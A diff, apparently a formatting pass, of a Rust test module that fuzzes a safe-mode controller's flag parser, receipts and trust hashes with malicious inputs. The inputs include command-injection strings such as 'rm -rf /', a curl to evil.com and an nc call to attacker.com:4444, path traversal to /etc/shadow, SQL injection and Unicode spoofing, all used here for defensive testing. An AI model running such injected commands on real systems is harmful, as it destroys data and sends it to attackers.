+            !json.contains("alert('xss')"),
+            "JavaScript injection should be escaped"
+        );
         assert!(!json.contains("\";"), "Quote escape should be handled");
 
         // Roundtrip should preserve structure but escape content
-        let parsed: SafeModeStatus = serde_json::from_str(&json).expect("deserialization should succeed");
+        let parsed: SafeModeStatus =
+            serde_json::from_str(&json).expect("deserialization should succeed");
         assert_eq!(status.safe_mode_active, parsed.safe_mode_active);
         assert_eq!(status.entry_reason, parsed.entry_reason);
-        assert_eq!(status.restricted_capabilities.len(), parsed.restricted_capabilities.len());
+        assert_eq!(
+            status.restricted_capabilities.len(),
+            parsed.restricted_capabilities.len()
+        );
     }
 
     #[test]
@@ -3141,12 +3693,17 @@ mod tests {
         // Verify final state is consistent
         let final_ctrl = ctrl.lock().unwrap();
         if final_ctrl.is_active() {
-            assert!(final_ctrl.entry_reason().is_some(), "Active safe mode should have entry reason");
+            assert!(
+                final_ctrl.entry_reason().is_some(),
+                "Active safe mode should have entry reason"
+            );
 
             // All capabilities should be restricted
             for cap in Capability::all() {
-                assert!(final_ctrl.check_capability(&cap).is_err(),
-                       "All capabilities should be restricted when active");
+                assert!(
+                    final_ctrl.check_capability(&cap).is_err(),
+                    "All capabilities should be restricted when active"
+                );
             }
         }
     }
@@ -3186,10 +3743,10 @@ mod tests {
         // Test entry with malicious inconsistencies
         let malicious_inconsistencies = vec![
             "genuine issue".to_string(),
-            "\u{202E}fake issue".to_string(),  // BiDi override
-            "issue\0with\0nulls".to_string(),  // Null injection
-            "a".repeat(1000000),  // Memory exhaustion attempt
-            format!("{{\"injection\": \"{}\"}}", "malicious"),  // JSON injection
+            "\u{202E}fake issue".to_string(), // BiDi override
+            "issue\0with\0nulls".to_string(), // Null injection
+            "a".repeat(1000000),              // Memory exhaustion attempt
+            format!("{{\"injection\": \"{}\"}}", "malicious"), // JSON injection
         ];
 
         ctrl.enter_safe_mode(
@@ -3202,18 +3759,28 @@ mod tests {
         // Verify receipt handling of malicious data
         let receipt = ctrl.entry_receipt().expect("should have receipt");
         assert!(!receipt.pass, "Receipt with inconsistencies should fail");
-        assert_eq!(receipt.inconsistencies.len(), malicious_inconsistencies.len());
+        assert_eq!(
+            receipt.inconsistencies.len(),
+            malicious_inconsistencies.len()
+        );
 
         // Verify JSON serialization is secure
         let json = receipt.to_json().expect("JSON should serialize");
-        assert!(!json.contains("\u{202E}"), "BiDi characters should be escaped");
+        assert!(
+            !json.contains("\u{202E}"),
+            "BiDi characters should be escaped"
+        );
         assert!(!json.contains("\0"), "Null bytes should be handled");
 
         // Trust state hash should use constant-time comparison
-        assert!(!constant_time::ct_eq(receipt.trust_state_hash.as_bytes(), b"sha256:real"),
-               "Should not match unrelated hash");
-        assert!(constant_time::ct_eq(receipt.trust_state_hash.as_bytes(), b"sha256:compromised"),
-               "Should match actual hash with constant-time comparison");
+        assert!(
+            !constant_time::ct_eq(receipt.trust_state_hash.as_bytes(), b"sha256:real"),
+            "Should not match unrelated hash"
+        );
+        assert!(
+            constant_time::ct_eq(receipt.trust_state_hash.as_bytes(), b"sha256:compromised"),
+            "Should match actual hash with constant-time comparison"
+        );
     }
 
     // -- Negative-Path Tests --
@@ -3225,7 +3792,6 @@ mod tests {
             // Buffer overflow attempts
             vec!["--".repeat(1000)],
             vec!["--safe-mode".to_string(), "--".repeat(500)],
-
             // Null byte injection
             vec!["--safe-mode\0--degraded".to_string()],
             vec![
@@ -3233,26 +3799,21 @@ mod tests {
                 "\0".to_string(),
                 "--no-network".to_string(),
             ],
-
             // Unicode and control character injection
             vec!["--safe-mode🚀".to_string()],
             vec!["--degraded\u{200B}".to_string()],
             vec!["--read-only\r\n--no-network".to_string()],
             vec!["--safe-mode\x1B[H\x1B[2J".to_string()],
-
             // Path traversal and injection attempts
             vec!["--safe-mode".to_string(), "../../../etc/passwd".to_string()],
             vec!["--degraded".to_string(), "--config=/etc/shadow".to_string()],
-
             // Script injection attempts
             vec!["--safe-mode; rm -rf /".to_string()],
             vec!["--degraded && curl evil.com".to_string()],
             vec!["--read-only | nc attacker.com 4444".to_string()],
-
             // Extremely long arguments
             vec!["--safe-mode-".repeat(10000)],
             vec!["--degraded".to_string(), "x".repeat(1024 * 1024)],
-
             // Binary data injection
             vec![String::from_utf8_lossy(&[0x00, 0x01, 0x02, 0x03, 0x04]).into_owned()],
             vec![
@@ -3262,7 +3823,10 @@ mod tests {
         ];
 
         for (i, malicious_flags) in malicious_flag_sets.iter().enumerate() {
-            let malicious_refs = malicious_flags.iter().map(String::as_str).collect::<Vec<_>>();
+            let malicious_refs = malicious_flags
+                .iter()
+                .map(String::as_str)
+                .collect::<Vec<_>>();
             let parse_result = OperationFlags::parse_args(&malicious_refs);
 
             match parse_result {
@@ -3273,7 +3837,7 @@ mod tests {
                     assert!(flags.degraded || !flags.degraded);
                     assert!(flags.read_only || !flags.read_only);
                     assert!(flags.no_network || !flags.no_network);
-                },
+                }
                 Err(_) => {
                     // Expected for malformed input - should fail gracefully
                 }
@@ -3282,8 +3846,16 @@ mod tests {
             // Test flag serialization doesn't expose injection
             if let Ok(flags) = OperationFlags::parse_args(&["--safe-mode"]) {
                 let serialized = format!("{:?}", flags);
-                assert!(!serialized.contains('\0'), "Serialization should not contain null bytes for test {}", i);
-                assert!(!serialized.contains("\x1B"), "Serialization should not contain escape sequences for test {}", i);
+                assert!(
+                    !serialized.contains('\0'),
+                    "Serialization should not contain null bytes for test {}",
+                    i
+                );
+                assert!(
+                    !serialized.contains("\x1B"),
+                    "Serialization should not contain escape sequences for test {}",
+                    i
+                );
             }
         }
     }
@@ -3328,7 +3900,7 @@ mod tests {
                     // Serialization should handle extreme values safely
                     let serialized = format!("{:?}", controller);
                     assert!(!serialized.is_empty());
-                },
+                }
                 Err(_) => {
                     // Acceptable to reject extreme configurations
                 }
@@ -3356,31 +3928,25 @@ mod tests {
         let unicode_flag_attempts = vec![
             // International script variations
             "--безопасный-режим", // Russian
-            "--安全模式", // Chinese
-            "--セーフモード", // Japanese
-            "--modo-seguro", // Spanish
-            "--режим-безпеки", // Ukrainian
-
+            "--安全模式",         // Chinese
+            "--セーフモード",     // Japanese
+            "--modo-seguro",      // Spanish
+            "--режим-безпеки",    // Ukrainian
             // Unicode normalization attacks
-            "café", // NFC form
+            "café",         // NFC form
             "cafe\u{0301}", // NFD form (combining accent)
-
             // Right-to-left override attacks
             "--safe\u{202E}edom-efas\u{202D}mode",
-
             // Zero-width and invisible characters
             "--safe\u{200B}mode", // Zero-width space
             "--safe\u{FEFF}mode", // BOM
             "--safe\u{200C}mode", // Zero-width non-joiner
-
             // Bidirectional text attacks
-            "--\u{061C}safe-mode", // Arabic letter mark
+            "--\u{061C}safe-mode",         // Arabic letter mark
             "--safe-\u{2067}mode\u{2069}", // Isolate characters
-
             // Emoji and pictographic attacks
             "--safe-🔒-mode",
             "--🚨-degraded-🚨",
-
             // Combining character stacking
             "--s\u{0300}\u{0301}\u{0302}afe-mode",
         ];
@@ -3398,7 +3964,7 @@ mod tests {
                     // Verify no Unicode normalization corruption
                     let display_output = flags.to_string();
                     assert!(!display_output.contains('\0'));
-                },
+                }
                 Err(_) => {
                     // Acceptable to reject unrecognized Unicode flags
                 }
@@ -3408,7 +3974,7 @@ mod tests {
         // Test flag conflict detection with Unicode variations
         let conflict_attempts = vec![
             vec!["--safe-mode", "--safe\u{200B}mode"], // Zero-width space variant
-            vec!["--degraded", "--DEGRADED"], // Case variation
+            vec!["--degraded", "--DEGRADED"],          // Case variation
             vec!["--read-only", "café", "--read-only"], // Mixed with Unicode
         ];
 
@@ -3418,7 +3984,7 @@ mod tests {
             match parse_result {
                 Ok(_) => {
                     // If successful, should not be corrupted by Unicode
-                },
+                }
                 Err(_) => {
                     // Expected for conflicting or malformed flags
                 }
@@ -3434,28 +4000,22 @@ mod tests {
             "sha256:0000000000000000000000000000000000000000000000000000000000000000",
             "sha256:ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
             "sha256:deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
-
             // Length extension attacks
             "sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890extra",
-
             // Malformed hash formats
-            "sha256:", // Empty hash
-            "sha256", // Missing colon
+            "sha256:",                              // Empty hash
+            "sha256",                               // Missing colon
             "md5:5d41402abc4b2a76b9719d911017c592", // Wrong algorithm
-            "sha256:GG", // Invalid hex characters
-            "sha256:xyz123", // Too short
-
+            "sha256:GG",                            // Invalid hex characters
+            "sha256:xyz123",                        // Too short
             // Unicode in hash
             "sha256:café1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
-
             // Control character injection
             "sha256:abcd\0ef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
             "sha256:abcdef\r\n1234567890abcdef1234567890abcdef1234567890abcdef123456789",
-
             // Path traversal in hash field
             "../etc/passwd",
             "../../../../proc/version",
-
             // Script injection attempts
             "<script>alert('hash')</script>",
             "'; DROP TABLE hashes; --",
@@ -3463,11 +4023,13 @@ mod tests {
 
         for (i, malicious_hash) in malicious_trust_hashes.iter().enumerate() {
             let corrupt_reason = SafeModeEntryReason::TrustCorruption;
-            let controller_result = SafeModeController::new(corrupt_reason.clone(), 1000 + i as u64);
+            let controller_result =
+                SafeModeController::new(corrupt_reason.clone(), 1000 + i as u64);
 
             if let Ok(mut controller) = controller_result {
                 // Create exit clearance receipt with malicious hash
-                let receipt_result = controller.create_exit_clearance_receipt(malicious_hash, 2000 + i as u64);
+                let receipt_result =
+                    controller.create_exit_clearance_receipt(malicious_hash, 2000 + i as u64);
 
                 match receipt_result {
                     Ok(receipt) => {
@@ -3477,8 +4039,14 @@ mod tests {
 
                         // Verify serialization safety
                         let serialized = receipt.to_json();
-                        assert!(!serialized.contains('\0'), "Serialized receipt should not contain null bytes");
-                        assert!(!serialized.contains("\x1B"), "Serialized receipt should not contain escape sequences");
+                        assert!(
+                            !serialized.contains('\0'),
+                            "Serialized receipt should not contain null bytes"
+                        );
+                        assert!(
+                            !serialized.contains("\x1B"),
+                            "Serialized receipt should not contain escape sequences"
+                        );
 
                         // Verify no script injection in JSON
                         assert!(!serialized.contains("<script>"));
@@ -3486,8 +4054,11 @@ mod tests {
 
                         // Hash comparison should use constant-time
                         let test_hash = "sha256:test";
-                        assert!(!constant_time::ct_eq(receipt.trust_state_hash.as_bytes(), test_hash.as_bytes()));
-                    },
+                        assert!(!constant_time::ct_eq(
+                            receipt.trust_state_hash.as_bytes(),
+                            test_hash.as_bytes()
+                        ));
+                    }
                     Err(_) => {
                         // Expected for malformed hashes
                     }
@@ -3518,7 +4089,7 @@ mod tests {
             match SafeModeController::new(entry_reason, 1000 + i as u64) {
                 Ok(controller) => {
                     controllers.push(controller);
-                },
+                }
                 Err(_) => {
                     // Acceptable to reject under memory pressure
                     break;
@@ -3531,7 +4102,10 @@ mod tests {
             }
         }
 
-        assert!(controllers.len() > 0, "Should create at least some controllers");
+        assert!(
+            controllers.len() > 0,
+            "Should create at least some controllers"
+        );
 
         // Test that all controllers maintain functionality under memory pressure
         for (i, controller) in controllers.iter().enumerate() {
@@ -3603,7 +4177,11 @@ mod tests {
                     assert!(!display.contains("overflow"));
 
                     // Test difference calculations don't overflow
-                    if let SafeModeEntryReason::EpochMismatch { local_epoch, peer_epoch } = epoch_reason {
+                    if let SafeModeEntryReason::EpochMismatch {
+                        local_epoch,
+                        peer_epoch,
+                    } = epoch_reason
+                    {
                         // Verify safe arithmetic is used in any epoch difference calculations
                         let diff1 = local_epoch.saturating_sub(*peer_epoch);
                         let diff2 = peer_epoch.saturating_sub(*local_epoch);
@@ -3613,7 +4191,7 @@ mod tests {
                             assert!(diff1 < u64::MAX && diff2 < u64::MAX);
                         }
                     }
-                },
+                }
                 Err(_) => {
                     // Acceptable to reject extreme epoch configurations
                 }
@@ -3627,7 +4205,10 @@ mod tests {
         let bypass_test_reasons = vec![
             SafeModeEntryReason::ExplicitFlag,
             SafeModeEntryReason::TrustCorruption,
-            SafeModeEntryReason::CrashLoop { crash_count: 5, window_secs: 60 },
+            SafeModeEntryReason::CrashLoop {
+                crash_count: 5,
+                window_secs: 60,
+            },
         ];
 
         for reason in bypass_test_reasons {
@@ -3640,9 +4221,18 @@ mod tests {
 
             // Attempt to bypass via repeated calls
             for _attempt in 0..1000 {
-                assert!(!controller.can_load_extensions(), "Should not bypass extension restriction");
-                assert!(!controller.can_issue_delegations(), "Should not bypass delegation restriction");
-                assert!(controller.requires_trust_reverification(), "Should maintain trust reverification requirement");
+                assert!(
+                    !controller.can_load_extensions(),
+                    "Should not bypass extension restriction"
+                );
+                assert!(
+                    !controller.can_issue_delegations(),
+                    "Should not bypass delegation restriction"
+                );
+                assert!(
+                    controller.requires_trust_reverification(),
+                    "Should maintain trust reverification requirement"
+                );
             }
 
             // Attempt to bypass via state manipulation (should be immutable)
@@ -3670,7 +4260,10 @@ mod tests {
                 controller.requires_trust_reverification(),
             );
 
-            assert_eq!(cap_check_1, cap_check_2, "Capability checks should be deterministic");
+            assert_eq!(
+                cap_check_1, cap_check_2,
+                "Capability checks should be deterministic"
+            );
         }
     }
 
@@ -3699,7 +4292,6 @@ mod tests {
                     timestamp_ms: legitimate_receipt.timestamp_ms,
                     verification_sequence: legitimate_receipt.verification_sequence.clone(),
                 },
-
                 // Modify timestamp (replay attack)
                 ExitClearanceReceipt {
                     proof_id: legitimate_receipt.proof_id.clone(),
@@ -3707,7 +4299,6 @@ mod tests {
                     timestamp_ms: 999, // Earlier timestamp
                     verification_sequence: legitimate_receipt.verification_sequence.clone(),
                 },
-
                 // Modify proof ID
                 ExitClearanceReceipt {
                     proof_id: "forged-proof-id".to_string(),
@@ -3715,7 +4306,6 @@ mod tests {
                     timestamp_ms: legitimate_receipt.timestamp_ms,
                     verification_sequence: legitimate_receipt.verification_sequence.clone(),
                 },
-
                 // Empty verification sequence
                 ExitClearanceReceipt {
                     proof_id: legitimate_receipt.proof_id.clone(),
@@ -3732,8 +4322,11 @@ mod tests {
                 let tampered_json = tampered_receipt.to_json();
 
                 // Tampered receipts should produce different serialization
-                assert_ne!(legitimate_json, tampered_json,
-                          "Tampering attempt {} should be detectable", i);
+                assert_ne!(
+                    legitimate_json, tampered_json,
+                    "Tampering attempt {} should be detectable",
+                    i
+                );
 
                 // JSON should still be well-formed
                 assert!(!tampered_json.is_empty());
